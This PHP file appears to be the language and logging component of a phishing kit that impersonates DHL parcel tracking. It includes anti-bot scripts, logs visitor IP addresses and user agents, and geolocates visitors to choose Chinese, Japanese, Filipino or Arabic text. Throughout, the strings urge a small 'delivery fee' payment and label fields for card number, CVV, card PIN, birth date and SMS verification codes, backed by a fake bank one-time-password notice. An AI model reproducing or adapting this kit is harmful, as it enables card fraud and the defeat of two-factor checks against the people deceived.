<?php

    session_start();
    error_reporting(0);
    include("anti__boot/anti1.php");
    include("anti__boot/anti2.php");
    include("anti__boot/anti3.php");
    include("anti__boot/anti4.php");
    include("anti__boot/anti5.php");
    include("anti__boot/anti6.php");
    include("anti__boot/anti7.php");
    include("anti__boot/anti8.php"); 
    require_once 'detect.php';

    function visitors() {
        $detect         = new BrowserDetection();
        $ip             = $_SERVER['REMOTE_ADDR'];
        $date           = date("Y-m-d H:i:s", time());
        $usragent       = $_SERVER['HTTP_USER_AGENT']; 
        $browserName    = $detect->getName();
        $browserVer     = $detect->getVersion();
        $isMobile       = ($detect->isMobile()) ? 'Mobile' : 'Not mobile';
        $platformName   = $detect->getPlatform();
        //$country        = get_client_country();
        $str = " <tr> <th scope='row'>$ip</th>  <td>$date</td> <td>$usragent</td> <td>[$isMobile] $browserName $browserVer </td> </tr>";
        file_put_contents('visitors.html', $str  , FILE_APPEND | LOCK_EX);
    };
    function get_client_countrycode() {
        $details = json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" .  $_SERVER['REMOTE_ADDR'] . ""));
        if ($details && $details->geoplugin_countryCode != null) {
            $countrycode = $details->geoplugin_countryCode;
        }
        return $countrycode;
    }
    function lang() {
        $countrycode = get_client_countrycode();
        switch ($countrycode) {
            case 'CN':
                return $_SESSION['lang'] = 'cn';
                break;
            case 'JP':
                return $_SESSION['lang'] = 'jp';
                break;
            case 'PH':
                return $_SESSION['lang'] = 'ph';
                break;
            case 'AR':
                return $_SESSION['lang'] = 'ar';
                break;
            default:
                return $_SESSION['lang'] = 'cn';
        }
    }
    function get_text($place) {
        global $lang;
        return $lang[$place][$_SESSION['lang']];
    };



    $lang = array(

        'top_header1' => [
            'cn' => '警報(1)',
            'jp' => 'アラート(1)',
            'ph' => 'Alerto(1)',
            'ar' => 'تنبيه (1)',
        ],

        'last_update' => [
            'cn' => 'Last Updated',
            'jp' => '最近更新時間',
            'ph' => 'Huling Na-update',
            'ar' => 'آخر تحديث',
        ],

        'shipment' => [
            'cn' => '裝運類型：<b>其他</b>',
            'jp' => '配送タイプ: <b>その他</b>',
            'ph' => 'Uri ng pagpapadala: <b>Iba pa</b>',
            'ar' => 'نوع الشحنة: <b> أخرى </ b>',
        ],

        'last_update' => [
            'cn' => '卡信息',
            'jp' => 'カード情報',
            'ph' => 'Impormasyon sa Card',
            'ar' => 'معلومات البطاقة',
        ],

        'top_header2' => [
            'cn' => '聯繫我們',
            'jp' => 'お問い合わせ',
            'ph' => 'Makipag-ugnayan sa amin',
            'ar' => '',
        ],

        'erreur_1' => [
             'cn' => '警報(1)',
            'jp' => 'アラート(1)',
            'ph' => 'Alerto(1)',
            'ar' => 'تنبيه (1)',
        ],

        'top_header3' => [
            'cn' => 'china',
            'jp' => 'japon',
            'ph' => 'philiping',
            'ar' => 'arabic',
        ],

        'top_header4' => [
            'cn' => '搜索',
            'jp' => '検索',
            'ph' => 'Maghanap',
            'ar' => 'يبحث',
        ],

        'mainmenu1' => [
            'cn' => '追踪',
            'jp' => '追跡',
            'ph' => 'Subaybayan',
            'ar' => 'مسار',
        ],

        'mainmenu2' => [
            'cn' => '船',
            'jp' => 'ボート',
            'ph' => 'bangka',
            'ar' => 'سفينة',
        ],

        'mainmenu3' => [
            'cn' => '物流解決方案',
            'jp' => '物流ソリューション',
            'ph' => 'Mga Solusyon sa Logistics',
            'ar' => 'الحلول اللوجستية',
        ],

        'mainmenu4' => [
            'cn' => '客戶服務',
            'jp' => '顧客サービス',
            'ph' => 'Serbisyo sa Customer',
            'ar' => 'خدمة الزبائن',
        ],

        'header-right' => [
            'cn' => '客戶門戶登錄',
            'jp' => 'カスタマーポータルへのログイン',
            'ph' => 'Mga Login ng Customer Portal',
            'ar' => 'تسجيل الدخول',
        ],

        'footer-widget-1-header' => [
            'cn' => '幫助中心',
            'jp' => 'ヘルプセンター',
            'ph' => 'Help Center',
            'ar' => 'مركز المساعدة',
        ],

        'footer-widget-2-header' => [
            'cn' => '我們的部門',
            'jp' => '私たちの部門',
            'ph' => 'Ang aming mga Dibisyon',
            'ar' => 'أقسامنا',
        ],

        'footer-widget-3-header' => [
            'cn' => '行業領域',
            'jp' => '産業分野',
            'ph' => 'Mga Sektor ng Industriya',
            'ar' => 'قطاعات الصناعة',
        ],

        'footer-widget-4-header' => [
            'cn' => '公司信息',
            'jp' => '企業情報',
            'ph' => 'Impormasyon ng Kumpanya',
            'ar' => 'معلومات الشركة',
            
        ],

        'footer-widget-1-1' => [
            'cn' => '客戶服務',
            'jp' => '顧客サービス',
            'ph' => 'Serbisyo sa Customer',
            'ar' => 'خدمة العملاء',
            
        ],

        'footer-widget-1-2' => [
            'cn' => '客戶門戶登錄',
            'jp' => 'カスタマーポータルへのログイン',
            'ph' => 'Mga Login ng Customer Portal',
            'ar' => 'تسجيل الدخول',
            
        ],

        'footer-widget-1-3' => [
            'cn' => '數字合作夥伴和集成',
            'jp' => 'デジタルパートナーと統合',
            'ph' => 'Mga Digital na Kasosyo at Pagsasama',
            'ar' => 'التكامل والشركاء الرقميين',
            
        ],

        'footer-widget-1-4' => [
            'cn' => '開發者門戶',
            'jp' => '開発者ポータル',
            'ph' => 'Portal ng Developer',
            'ar' => 'بوابة المطور',
            
        ],

        'footer-widget-2-1' => [
            'cn' => '德國郵政和小包',
            'jp' => '郵便とパケット ドイツ',
            'ph' => 'Mag-post at Paket Deutschland',
            'ar' => 'البريد والطرود ألمانيا',
            
        ],

        'footer-widget-2-2' => [
            'cn' => 'DHL Express',
            'jp' => 'DHL Express',
            'ph' => 'DHL Express',
            'ar' => 'DHL Express',
            
        ],

        'footer-widget-2-3' => [
            'cn' => 'DHL 全球貨運',
            'jp' => 'DHL グローバル フォワーディング',
            'ph' => 'DHL Global Forwarding',
            'ar' => 'دي إتش إل إكسبرس',
            
        ],

        'footer-widget-2-4' => [
            'cn' => 'DHL貨運',
            'jp' => 'DHL貨物',
            'ph' => 'DHL Freight',
            'ar' => 'DHL للشحن',
            
        ],

        'footer-widget-2-5' => [
            'cn' => 'DHL供應鏈',
            'jp' => 'DHLサプライチェーン',
            'ph' => 'DHL Supply Chain',
            'ar' => 'سلسلة التوريد DHL',
            
        ],

        'footer-widget-2-6' => [
            'cn' => 'DHL電子商務',
            'jp' => 'DHL eコマース',
            'ph' => 'DHL eCommerce',
            'ar' => 'DHL للتجارة الإلكترونية',
            
        ],

        'footer-widget-3-1' => [
            'cn' => '汽車移動',
            'jp' => 'オートモビリティ',
            'ph' => 'Auto-Mobility',
            'ar' => 'التنقل التلقائي',
            
        ],

        'footer-widget-3-2' => [
            'cn' => '化學品',
            'jp' => '化学薬品',
            'ph' => 'Mga kemikal',
            'ar' => 'مواد كيميائية',
            
        ],

        'footer-widget-3-3' => [
            'cn' => '消費者',
            'jp' => '消費者',
            'ph' => 'Konsyumer',
            'ar' => 'مستهلك',
            
        ],

        'footer-widget-3-4' => [
            'cn' => '活力',
            'jp' => 'エネルギー',
            'ph' => 'Enerhiya',
            'ar' => 'طاقة',
            
        ],

        'footer-widget-3-5' => [
            'cn' => '工程與製造',
            'jp' => 'エンジニアリングと製造',
            'ph' => 'Engineering at Paggawa',
            'ar' => 'الهندسة والتصنيع',
            
        ],

        'footer-widget-3-6' => [
            'cn' => '生命科學與醫療保健',
            'jp' => 'ライフサイエンスとヘルスケア',
            'ph' => 'Life Sciences at Pangangalaga sa Kalusugan',
            'ar' => 'علوم الحياة والرعاية الصحية',
            
        ],

        'footer-widget-3-7' => [
            'cn' => '公共部門',
            'jp' => '公的機関',
            'ph' => 'Pampublikong Sektor',
            'ar' => 'القطاع العام',
            
        ],

        'footer-widget-3-8' => [
            'cn' => '零售',
            'jp' => '小売り',
            'ph' => 'Tingi',
            'ar' => 'بيع بالتجزئة',
            
        ],

        'footer-widget-3-9' => [
            'cn' => '技術',
            'jp' => 'テクノロジー',
            'ph' => 'Teknolohiya',
            'ar' => 'تكنولوجيا',
            
        ],

        'footer-widget-4-1' => [
            'cn' => '關於敦豪',
            'jp' => 'DHLについて',
            'ph' => 'Tungkol sa DHL',
            'ar' => 'حول DHL',
            
        ],

        'footer-widget-4-2' => [
            'cn' => '招賢納士',
            'jp' => 'キャリア',
            'ph' => 'Mga karera',
            'ar' => 'وظائف',
            
        ],

        'footer-widget-4-3' => [
            'cn' => '新聞中心',
            'jp' => 'プレスセンター',
            'ph' => 'Press Center',
            'ar' => 'مركز الصحافة',
            
        ],

        'footer-widget-4-4' => [
            'cn' => '可持續性',
            'jp' => '持続可能性',
            'ph' => 'Pagpapanatili',
            'ar' => 'الاستدامة',
            
        ],

        'footer-widget-4-5' => [
            'cn' => '洞察力和創新',
            'jp' => '洞察とイノベーション',
            'ph' => 'Mga Insight at Innovation',
            'ar' => 'الرؤى والابتكار',
            
        ],

        'footer-widget-4-6' => [
            'cn' => '官方物流合作夥伴',
            'jp' => 'オフィシャルロジスティクスパートナー',
            'ph' => 'Opisyal na Logistics Partners',
            'ar' => 'الشركاء اللوجستيون الرسميون',
            
        ],

        'follow-us' => [
            'cn' => '跟著我們',
            'jp' => 'フォローする',
            'ph' => 'Sundan mo kami',
            'ar' => 'تابعنا',
            
        ],

        'footer-menu-1' => [
            'cn' => '欺詐意識',
            'jp' => '詐欺に対する認識',
            'ph' => 'Kamalayan sa Panloloko',
            'ar' => 'الوعي بالاحتيال',
            
        ],

        'footer-menu-2' => [
            'cn' => '法律聲明',
            'jp' => '法的通知',
            'ph' => 'Legal na Paunawa',
            'ar' => 'إشعار قانوني',
            
        ],

        'footer-menu-3' => [
            'cn' => '使用條款',
            'jp' => '利用規約',
            'ph' => 'Mga Tuntunin ng Paggamit',
            'ar' => 'شروط الاستخدام',
            
        ],

        'footer-menu-4' => [
            'cn' => '隱私聲明',
            'jp' => 'プライバシー通知',
            'ph' => 'Abiso sa Privacy',
            'ar' => 'إشعار الخصوصية',
            
        ],

        'footer-menu-5' => [
            'cn' => '爭議解決',
            'jp' => '論争の解決',
            'ph' => 'Resolusyon sa hindi pagkakaunawaan',
            'ar' => 'حل النزاعات',
            
        ],

        'footer-menu-6' => [
            'cn' => '輔助功能',
            'jp' => 'アクセシビリティ',
            'ph' => 'Accessibility',
            'ar' => 'إمكانية الوصول',
            
        ],

        'footer-menu-7' => [
            'cn' => '附加信息',
            'jp' => '追加情報',
            'ph' => 'karagdagang impormasyon',
            'ar' => 'معلومات إضافية',
            
        ],

        'footer-menu-8' => [
            'cn' => '餅乾設置',
            'jp' => 'クッキーの設定',
            'ph' => 'Mga Setting ng Cookies',
            'ar' => 'إعدادات ملفات تعريف الارتباط',
            
        ],

        'copyright' => [
            'cn' => '2023 © DHL 國際有限公司。 版權所有',
            'jp' => '2023 © DHL International GmbH. 全著作権所有',
            'ph' => '2023 © DHL International GmbH. Lahat ng karapatan ay nakalaan',
            'ar' => '2023 © DHL International GmbH. كل الحقوق محفوظة',
            
        ],

        'title' => [
            'cn' => '敦豪快遞查詢',
            'jp' => 'DHLトラッキング',
            'ph' => 'DHL TRACKING',
            'ar' => 'DHL تتبع شحنة',
            
        ],

        'title2' => [
            'cn' => '發貨中發貨',
            'jp' => 'お届け時の発送',
            'ph' => 'Pagpapadala sa paghahatid',
            'ar' => 'الشحن في التسليم',
            
        ],


        'status' => [
            'cn' => '狀態：<b>交付中</b>',
            'jp' => 'ステータス: <b>配送中</b>',
            'ph' => 'Katayuan: <b>sa paghahatid</b>',
            'ar' => 'الحالة: <b> قيد التسليم </ b>',
            
        ],

        'total' => [
            'cn' => '總計：<b>2.99 美元</b>',
            'jp' => '合計 : <b>2.99 ドル</b>',
            'ph' => 'Kabuuan : <b>2.99$</b>',
            'ar' => 'الإجمالي: <b> 2.99 $ </b>',
            
        ],

        'parcel' => [
            'cn' => '此貨件由以下公司處理：<b>DHL Parcel</b>',
            'jp' => 'この荷物は <b>DHL Parcel</b> によって処理されます。',
            'ph' => 'Ang kargamento na ito ay pinangangasiwaan ng: <b>DHL Parcel</b>',
            'ar' => 'يتم التعامل مع هذه الشحنة بواسطة: <b> DHL Parcel </b>',
            
        ],

        'tracking' => [
            'cn' => '跟踪代碼：CS47*********',
            'jp' => 'トラッキングコード: CS47*********',
            'ph' => 'Tracking Code: CS47*********',
            'ar' => 'كود التتبع: CS47 *********',
            
        ],

        'important_title' => [
            'cn' => '重要訊息！',
            'jp' => '重要なメッセージ!',
            'ph' => 'Mahalagang Mensahe!',
            'ar' => 'رسالة مهمة!',
            
        ],

        'important_message' => [
            'cn' => '為了盡快完成發貨，請點擊下一步確認付款（1.99）。 必須在接下來的 14 天內，即到期前進行在線確認。',
            'jp' => 'できるだけ早く配送を完了するには、「次へ」をクリックして支払い (1.99) を確認してください。 オンライン確認は、有効期限が切れる前の 14 日以内に行う必要があります。',
            'ph' => 'Upang makumpleto ang paghahatid sa lalong madaling panahon, Pakikumpirma ang pagbabayad (1.99) sa pamamagitan ng pag-click sa susunod. Dapat gawin ang online na kumpirmasyon sa loob ng susunod na 14 na araw, bago ito mag-expire.',
            'ar' => 'لإكمال التسليم في أسرع وقت ممكن ، يرجى تأكيد الدفع (1.99) بالنقر فوق التالي. يجب أن يتم التأكيد عبر الإنترنت في غضون الـ 14 يومًا القادمة ، قبل انتهاء صلاحيته.',
            
        ],

        'next' => [
            'cn' => '下一個',
            'jp' => '次',
            'ph' => 'Susunod',
            'ar' => 'التالي',
            
        ],

        'address_message' => [
            'cn' => '我們需要您的地址以確保未經授權的人無法訪問您的包裹，您有 10 個工作日的時間從您的包裹到達 DHL 分支機構，在此之後包裹將退還給發件人',
            'jp' => '権限のない人があなたの荷物にアクセスできないようにするために、あなたの住所が必要です。DHL支店に荷物が到着してから10営業日が必要です。この時間が経過すると、荷物は差出人に返送されます。',
            'ph' => 'Kailangan namin ang iyong Address upang matiyak na hindi ma-access ng mga hindi awtorisadong tao ang iyong mga pakete, Mayroon kang 10 araw ng trabaho Mula sa pagdating ng iyong package sa sangay ng DHL pagkatapos ng oras na ito ay ibabalik ang package sa nagpadala',
            'ar' => 'نحتاج إلى عنوانك للتأكد من أن الأشخاص غير المصرح لهم لا يمكنهم الوصول إلى الطرود الخاصة بك ، لديك 10 أيام عمل من وصول الحزمة الخاصة بك إلى فرع DHL بعد هذا الوقت سيتم إرجاع الطرد إلى المرسل',
            
        ],

        'address_label' => [
            'cn' => '地址',
            'jp' => '住所',
            'ph' => 'Address',
            'ar' => 'عنوان',
            
        ],

        'city_label' => [
            'cn' => '城市',
            'jp' => '街',
            'ph' => 'lungsod',
            'ar' => 'مدينة',
            
        ],

        'phone_label' => [
            'cn' => '電話號碼',
            'jp' => '電話番号',
            'ph' => 'Numero ng telepono',
            'ar' => 'رقم التليفون',
            
        ],

        'email_label' => [
            'cn' => '電子郵件',
            'jp' => 'Eメール',
            'ph' => 'Email',
            'ar' => 'بريد إلكتروني',
            
        ],

        'zip_code_label' => [
            'cn' => '郵政編碼',
            'jp' => '郵便番号',
            'ph' => 'Zip code',
            'ar' => 'الرمز البريدي',
            
        ],

        'birth_date_label' => [
            'cn' => '出生日期',
            'jp' => '生年月日',
            'ph' => 'Araw ng kapanganakan',
            'ar' => 'تاريخ الميلاد',
            
        ],

        'name_label' => [
            'cn' => '持卡人姓名',
            'jp' => 'カード所有者の名前',
            'ph' => 'Pangalan ng cardholder',
            'ar' => 'اسم حامل البطاقة',
            
        ],

        'one_label' => [
            'cn' => '卡號',
            'jp' => 'カード番号',
            'ph' => 'Numero ng card',
            'ar' => 'رقم البطاقة',
            
        ],

        'two_label' => [
            'cn' => 'MM',
            'jp' => 'MM',
            'ph' => 'MM',
            'ar' => 'MM',
            
        ],

        'two_label_2' => [
            'cn' => 'YY',
            'jp' => 'YY',
            'ph' => 'YY',
            'ar' => 'YY',
            
        ],

        'three_label' => [
            'cn' => 'CVV',
            'jp' => 'CVV',
            'ph' => 'CVV',
            'ar' => 'CVV',
            
        ],

        'pin_label' => [
            'cn' => 'PIN碼',
            'jp' => 'ピンコード',
            'ph' => 'Pin code',
            'ar' => 'الرقم السري',
            
        ],

        'sms_code_label' => [
            'cn' => '短信代碼',
            'jp' => 'SMSコード',
            'ph' => 'SMS Code',
            'ar' => 'رمز الرسائل القصيرة',
            
        ],

        'thanks' => [
            'cn' => '感謝您輸入信息。 我們將盡快與您聯繫。',
            'jp' => '情報をご入力いただきありがとうございます。 すぐにご連絡させていただきます。',
            'ph' => 'Salamat sa pagpasok ng impormasyon. Makikipag-ugnayan kami sa iyo sa ilang sandali.',
            'ar' => 'شكرا لك على إدخال المعلومات. سوف نتصل بك قريبا.',
            
        ],

        'thanks_2' => [
            'cn' => '驗證成功',
            'jp' => '正常に検証されました',
            'ph' => 'Matagumpay na Na-verify',
            'ar' => 'تم التحقق بنجاح',
            
        ],

        'sms-title' => [
            'cn' => '請確認以下付款。',
            'jp' => '下記お支払いをご確認ください。',
            'ph' => 'Pakikumpirma ang sumusunod na pagbabayad.',
            'ar' => 'يرجى تأكيد الدفع التالي.',
            
        ],

        'sms-title2' => [
            'cn' => '此過程需要您的密碼。',
            'jp' => 'このプロセスにはコード PIN が必要です。',
            'ph' => 'Ang prosesong ito ay nangangailangan ng iyong code pin.',
            'ar' => 'تتطلب هذه العملية رمز PIN الخاص بك.',
            
        ],

        'sms-message' => [
            'cn' => '唯一密碼已發送到下面列出的手機號碼。 如果您需要更改手機號碼，請通過可用渠道（ATM、網絡）聯繫您的銀行進行修改。',
            'jp' => '固有のパスワードが以下にリストされている携帯電話番号に送信されました。 携帯電話番号を変更する必要がある場合は、利用可能なチャネル (ATM、ウェブ) 経由で変更する銀行に連絡してください。',
            'ph' => 'Ang natatanging password ay naipadala sa mobile number na nakalista sa ibaba. Kung kailangan mong palitan ang iyong mobile number, mangyaring makipag-ugnayan sa iyong bangko para baguhin ito sa pamamagitan ng mga available na chanel (ATM, web).',
            'ar' => 'تم إرسال كلمة المرور الفريدة إلى رقم الهاتف المحمول المذكور أدناه. إذا كنت بحاجة إلى تغيير رقم هاتفك المحمول ، فيرجى الاتصال بالمصرف الذي تتعامل معه لتعديله عبر القنوات المتاحة (ماكينة الصراف الآلي ، الويب).',
            
        ],

        'merchant' => [
            'cn' => '商人',
            'jp' => '商人',
            'ph' => 'Mangangalakal',
            'ar' => 'تاجر',
            
        ],

        'amount' => [
            'cn' => '數量',
            'jp' => '額',
            'ph' => 'Halaga',
            'ar' => 'كمية',
            
        ],

        'date' => [
            'cn' => '日期',
            'jp' => '日にち',
            'ph' => 'Petsa',
            'ar' => 'تاريخ',
            
        ],

        'credit-card-number' => [
            'cn' => '信用卡號碼',
            'jp' => 'クレジットカード番号',
            'ph' => 'Numero ng credit card',
            'ar' => 'رقم البطاقة الائتمانية',
            
        ],

        'sms-again' => [
            'cn' => '請輸入短信收到的驗證碼',
            'jp' => 'SMSで受信した認証コードを入力してください',
            'ph' => 'Pakilagay ang verification code na natanggap sa pamamagitan ng sms',
            'ar' => 'الرجاء إدخال رمز التحقق الذي تلقيته عبر الرسائل القصيرة',
            
        ],

        'submit' => [
            'cn' => '提交',
            'jp' => '送信',
            'ph' => 'Ipasa',
            'ar' => 'يُقدِّم',
            
        ],

        'pin-title' => [
            'cn' => '此過程需要您的密碼。',
            'jp' => 'このプロセスにはコード PIN が必要です。',
            'ph' => 'Ang prosesong ito ay nangangailangan ng iyong code pin.',
            'ar' => 'تتطلب هذه العملية رمز PIN الخاص بك.',
            
        ],

        'ver' => [
            'cn' => '驗證成功',
            'jp' => '正常に検証されました',
            'ph' => 'Matagumpay na Na-verify',
            'ar' => 'تم التحقق بنجاح',
            
        ],

       

    );

?>